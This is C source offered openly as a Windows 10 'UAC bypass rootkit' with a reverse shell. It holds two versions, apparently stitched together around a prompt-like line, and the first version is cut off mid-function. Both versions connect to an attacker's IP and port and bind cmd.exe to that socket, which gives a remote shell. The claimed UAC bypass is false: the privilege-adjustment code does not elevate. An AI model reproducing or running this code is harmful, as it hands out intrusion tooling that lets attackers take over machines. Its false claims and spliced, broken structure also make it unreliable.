#include <windows.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <winsock2.h>



// UAC Bypass Rootkit

// This code will bypass UAC and execute a reverse shell



// Global Variables

HANDLE hToken;

TOKEN_PRIVILEGES tkp;



// Function Prototypes

BOOL EnablePrivilege(LPCTSTR lpszPrivilege);

BOOL ExecuteReverseShell(char *ip, int port);



int main(int argc, char *argv[])

{

    // Check for correct number of arguments

    if (argc != 3)

    {

        printf("Usage: %s <ip> <port>\n", argv[0]);

        return 0;

    }



    // Enable SeDebugPrivilege

    if (!EnablePrivilege(SE_DEBUG_NAME))

    {

        printf("[-] Failed to enable SeDebugPrivilege\n");

        return 0;

    }



    // Execute Reverse Shell

    if (!ExecuteReverseShell(argv[1], atoi(argv[2])))

    {

        printf("[-] Failed to execute reverse shell\n");

        return 0;

    }



    return 0;

}



// Enable SeDebugPrivilege

BOOL EnablePrivilege(LPCTSTR lpszPrivilege)

{

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))

    {

        printf("[-] Failed to open process token\n");

        return FALSE;

    }



    LookupPrivilegeValue(NULL, lpszPrivilege, &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;

    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;



    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);



    if (GetLastError() != ERROR_SUCCESS)

    {

        printf("[-] Failed to adjust token privileges\n");

        return FALSE;

    }



    return TRUE;

}



// Execute Reverse Shell

BOOL ExecuteReverseShell(char *ip, int port)

{

    WSADATA wsa;

    SOCKET s;

    struct sockaddr_in server;

    char cmd[] = "cmd.exe";

    STARTUPINFO si;

    PROCESS_INFORMATION pi;



    printf("[+] Connecting to %s:%d\n", ip, port);



    // Initialize Winsock

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)

    {

        printf("[-] Failed to initialize Winsock\n");

        return FALSE;

    }



    // Create Socket

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)

    {

        printf("[-] Failed to create socket\n");

        return FALSE;

    }



    // Connect to Server

    server.sin_addr.s_addr = inet_addr(ip);

    server.sin_family = AF_INET;

    server.sin_port = htons(port);



    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)

    {

        printf("[-] Failed to connect to server\n");

        return FALSE;

    }



    // Create Process

    ZeroMemory(&si, sizeof(si));

    si.cb = sizeof(si);

    ZeroMemory(&pi, sizeof(pi));



    si.dwFlags = STARTF_USESTDHANDLES;

    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;



    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))

    {

        printf("[-] Failed to create process\n");

        return FALSE;

    }



    printf("[+] Reverse shell created\n");



    // Cleanup

    closesocket(s);

    WSACleanup();



    return TRUE;







c++ example UAC bypass rootkit for windows 10 and reverse shell.



#include <windows.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <winsock2.h>



// UAC Bypass Rootkit

// This code will bypass UAC on Windows 10 and give you a reverse shell



// Create a process with elevated privileges

BOOL CreateProcessWithElevatedPrivileges(LPCTSTR lpApplicationName, LPCTSTR lpCommandLine)

{

    BOOL bResult = FALSE;

    HANDLE hToken = NULL;

    TOKEN_PRIVILEGES tp;

    STARTUPINFO si;

    PROCESS_INFORMATION pi;



    // Get the current process token

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken))

    {

        // Enable the SE_DEBUG_NAME privilege

        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);

        tp.PrivilegeCount = 1;

        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);



        // Create the process with elevated privileges

        ZeroMemory(&si, sizeof(si));

        si.cb = sizeof(si);

        ZeroMemory(&pi, sizeof(pi));

        if (CreateProcessAsUser(hToken, lpApplicationName, lpCommandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))

        {

            bResult = TRUE;

            CloseHandle(pi.hProcess);

            CloseHandle(pi.hThread);

        }



        // Disable the SE_DEBUG_NAME privilege

        tp.Privileges[0].Attributes = 0;

        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);

        CloseHandle(hToken);

    }



    return bResult;

}



// Reverse shell function

void ReverseShell(char *ip, int port)

{

    WSADATA wsaData;

    SOCKET Winsock;

    struct sockaddr_in hax;

    char buffer[1024];

    char cmd[] = "cmd.exe";

    STARTUPINFO ini_processo;

    PROCESS_INFORMATION processo_info;



    WSAStartup(MAKEWORD(2,2), &wsaData);

    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);



    hax.sin_family = AF_INET;

    hax.sin_port = htons(port);

    hax.sin_addr.s_addr = inet_addr(ip);



    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);



    memset(&ini_processo, 0, sizeof(ini_processo));

    ini_processo.cb=sizeof(ini_processo);

    ini_processo.dwFlags=STARTF_USESTDHANDLES;

    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;



    CreateProcessWithElevatedPrivileges(NULL, cmd);

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    WaitForSingleObject(processo_info.hProcess, INFINITE);

    CloseHandle(processo_info.hProcess);

    CloseHandle(processo_info.hThread);



    closesocket(Winsock);

    WSACleanup();

}



int main(int argc, char *argv[])

{

    char *ip;

    int port;



    if (argc < 3)

    {

        printf("Usage: %s <ip> <port>\n", argv[0]);

        exit(1);

    }



    ip = argv[1];

    port = atoi(argv[2]);



    ReverseShell(ip, port);



    return 0;

}
